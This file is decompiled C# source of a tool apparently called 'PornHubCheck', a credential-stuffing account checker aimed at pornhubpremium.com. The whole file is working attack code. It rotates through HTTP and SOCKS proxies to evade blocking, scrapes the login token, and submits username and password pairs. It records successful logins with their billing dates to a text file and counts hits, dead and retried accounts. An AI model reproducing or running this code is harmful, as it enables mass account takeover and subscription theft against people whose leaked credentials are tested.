using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Leaf.xNet;

namespace PornHubCheck
{
	// Token: 0x02000006 RID: 6
	internal class Requests
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002CE8 File Offset: 0x00000EE8
		public static void checkAccount(string Username, string Password)
		{
			for (;;)
			{
				try
				{
					string text = "";
					text = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];

					using (HttpRequest httpRequest = new HttpRequest())
					{
						switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
						{
						case 0:
							httpRequest.Proxy = HttpProxyClient.Parse(text);
							break;
						case 1:
							httpRequest.Proxy = Socks4ProxyClient.Parse(text);
							break;
						case 2:
							httpRequest.Proxy = Socks5ProxyClient.Parse(text);
							break;
						}
						httpRequest.KeepAlive = true;
						httpRequest.ConnectTimeout = 2500;
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36";
						object value = Regex.Match(httpRequest.Get("https://www.pornhubpremium.com/premium/login", null).ToString(), "name=\"token\" id=\"token\" value=\"(.*?)\"").Groups[1].Value;
						string address = "https://www.pornhubpremium.com/front/authenticate";
						string contentType = "application/x-www-form-urlencoded; charset=UTF-8";
						string[] array = new string[7];
						array[0] = "username=";
						array[1] = Username;
						array[2] = "&password=";
						array[3] = Password;
						object obj = "&token=";
						array[4] = (string)obj;
						array[5] = (string)value;
						object obj2 = "&redirect=&from=pc_premium_login&segment=straight";
						object obj3 = obj2;
						array[6] = (string)obj3;
						string str = string.Concat(array);
						httpRequest.Referer = "https://www.pornhubpremium.com/premium/login";
						httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
						httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
						HttpResponse httpResponse = httpRequest.Post(address, str, contentType);
						if ((((IEnumerable<string>)Requests.SuccessKeys).Any(new Func<string, bool>(httpResponse.ToString().Contains)) ? 1u : 0u) != (uint)0)
						{
							Colorful.Console.WriteLine(string.Concat(new string[]
							{
								Username,
								":",
								Password,
								" Next Billing Date: ",
								Requests.getExpiration(httpResponse.Cookies, text).Replace(" ", "")
							}), Color.Green);
							string[] array2 = new string[5];
							array2[0] = Username;
							array2[1] = ":";
							array2[2] = Password;
							array2[3] = " Next Billing Date: ";
							string[] array3 = array2;
							object obj4 = Requests.getExpiration(httpResponse.Cookies, text).Replace(" ", "");
							Utilities.writeToText(string.Concat(array2));
							contentType = (string)obj4;
							Interlocked.Increment(ref Program.hitCnt);
						}
						else
						{
							if ((((IEnumerable<string>)Requests.FailureKeys).Any(new Func<string, bool>(httpResponse.ToString().Contains)) ? 1u : 0u) == (uint)0)
							{
								Interlocked.Increment(ref Program.retryCnt);
								continue;
							}
							Interlocked.Increment(ref Program.deadCnt);
						}
						break;
					}
					continue;
					break;
				}
				catch (Exception ex)
				{
					Interlocked.Increment(ref Program.retryCnt);
				}
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000030D0 File Offset: 0x000012D0
		public static string getExpiration(CookieStorage Cookies, string PROXY)
		{
			string result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
					{
					case 0:
						httpRequest.Proxy = HttpProxyClient.Parse(PROXY);
						break;
					case 1:
						httpRequest.Proxy = Socks4ProxyClient.Parse(PROXY);
						break;
					case 2:
						httpRequest.Proxy = Socks5ProxyClient.Parse(PROXY);
						break;
					}
					httpRequest.KeepAlive = true;
					httpRequest.ConnectTimeout = 2500;
					httpRequest.IgnoreProtocolErrors = true;
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36";
					httpRequest.Cookies = Cookies;
					result = Regex.Match(httpRequest.Get("https://www.pornhubpremium.com/user/manage/start", null).ToString(), "Next Billing Date (.*?)<\\/date>").Groups[1].Value;
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003210 File Offset: 0x00001410
		// Note: this type is marked as 'beforefieldinit'.
		static Requests()
		{
			Requests.SuccessKeys = new string[]
			{
				"\"success\":\"1\""
			};
			Requests.FailureKeys = new string[]
			{
				"Invalid username\\/password!"
			};
		}

		// Token: 0x0400000D RID: 13
		private const string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36";

		// Token: 0x0400000E RID: 14
		private static string[] SuccessKeys;

		// Token: 0x0400000F RID: 15
		private static string[] FailureKeys;
	}
}
